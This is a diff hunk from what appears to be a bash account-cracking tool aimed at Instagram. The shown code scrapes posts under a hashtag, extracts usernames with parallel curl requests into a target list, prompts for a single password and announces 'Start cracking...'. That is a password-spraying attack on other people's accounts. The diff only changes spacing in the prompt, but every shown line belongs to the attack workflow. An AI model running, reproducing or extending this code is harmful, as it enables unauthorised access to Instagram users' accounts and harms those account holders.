@@ -61,7 +61,7 @@ case $opt in
             echo "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
             echo -e "${white}[${blue}!${white}] Removing duplicate user from tag ${red}#$hashtag${white}"$(sort -u result > hashtag)
             echo -e "[${blue}+${white}] Just found        : ${yellow}"$(< hashtag wc -l ; echo -e "${white}user")
-            read -p $'[\e[34m?\e[37m] Password to use    : \e[1;33m' pass
+            read -p $'[\e[34m?\e[37m] Password to use   : \e[1;33m' pass
             echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
             for tag in $(cat hashtag); do
                 echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
